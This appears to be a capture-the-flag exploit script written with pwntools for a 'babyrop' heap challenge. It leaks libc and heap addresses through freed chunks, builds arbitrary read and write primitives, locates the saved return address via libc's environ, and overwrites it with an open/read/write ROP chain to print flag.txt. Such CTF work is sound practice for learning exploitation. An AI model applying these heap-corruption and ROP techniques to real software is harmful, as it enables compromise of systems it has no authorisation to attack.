import pwn

pwn.context.terminal = ['tmux', 'splitw', '-h']
elf = pwn.context.binary = pwn.ELF('./babyrop')

if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path, '''set $heap = 0x4066b0\nc\n''')
    libc = pwn.ELF("./libc.so.6")
elif pwn.args.REMOTE:
    io = pwn.remote("mc.ax", 31245)
    libc = pwn.ELF("./libc.so.6")
else:
    io = pwn.process(elf.path)
    libc = pwn.ELF("./libc.so.6")


def create(idx, size, data):
    io.sendlineafter(b": ", b"C")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", str(size).encode())
    io.sendafter(b": ", data)


def read(idx):
    io.sendlineafter(b": ", b"R")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvline()
    bytes_ret = b""
    arr = io.recvline().strip().split(b" ")
    for x in arr:
        bytes_ret += int(x, 16).to_bytes(1, "little")
    return bytes_ret


def edit(idx, data):
    io.sendlineafter(b": ", b"W")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendafter(b": ", data)

# default heap - 0x4066b0


def free(idx):
    io.sendlineafter(b": ", b"F")
    io.sendlineafter(b": ", str(idx).encode())


def exit_option():
    io.sendlineafter(b": ", b"E")
    io.sendlineafter(b": ", b"1")


def arbitary_read(addr):
    edit(7, pwn.p64(0xdeadbeef)*32+pwn.p64(0x110) +
         pwn.p64(0x20)+pwn.p64(0x300)+pwn.p64(addr))
    return read(8)


def arbitary_write(addr, val):
    edit(7, pwn.p64(0xdeadbeef)*32+pwn.p64(0x110) +
         pwn.p64(0x20)+pwn.p64(0x300)+pwn.p64(addr))
    edit(8, val)


for _ in range(6):
    create(_, 0x100, b'Z')
create(6, 0x100, b'A')
create(7, 0x100, b'B')
create(8, 0x100, b'C')
create(9, 0x100, b'D')
for i in range(6):
    free(i)
free(9)
free(7)
leak = read(7)
libc_leak = leak[:8]
libc_leak = pwn.u64(libc_leak)
pwn.log.success("Libc Leak: " + hex(libc_leak))
libc.address = libc_leak - 0x1f4cc0
pwn.log.success("Libc Base: " + hex(libc.address))
heap_corr_leak = leak[280:288]
heap_corr_leak = pwn.u64(heap_corr_leak)
pwn.log.success("Heap Corr Leak: " + hex(heap_corr_leak))
heap_base = (heap_corr_leak & 0xfffffffffffff000) - 0x2000
pwn.log.success("Heap Base: " + hex(heap_base))
pwn.log.success("Libc Environ: "+hex(libc.symbols['environ']))
environ = arbitary_read(libc.sym['environ'])
environ = pwn.u64(environ[0:8])
pwn.log.success("Stack Leak: " + hex(environ))
rip = environ - 0x140
pwn.log.success("Saved Rip: " + hex(rip))
rop = pwn.ROP(libc, base=rip)
rop.close(3)
rop.open("flag.txt", 0)
rop.read(3, heap_base, 0x100)
rop.write(1, heap_base, 0x100)
print(rop.dump())
arbitary_write(rip, rop.chain())
exit_option()
io.interactive()
